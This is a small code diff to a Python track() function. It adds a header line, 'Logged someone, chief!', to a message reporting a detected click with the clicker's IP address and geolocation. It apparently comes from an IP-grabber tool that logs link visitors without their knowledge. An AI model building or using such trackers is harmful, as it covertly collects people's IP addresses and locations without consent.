@@ -29,6 +29,7 @@ def track():
 
     # Build message
     content = (
+        f"# Logged someone, chief!\n"
         f"👀 Click detected!\n"
         f"🌍 IP: `{ip}`\n"
         f"📍 Location: {city}, {region}, {country}\n"
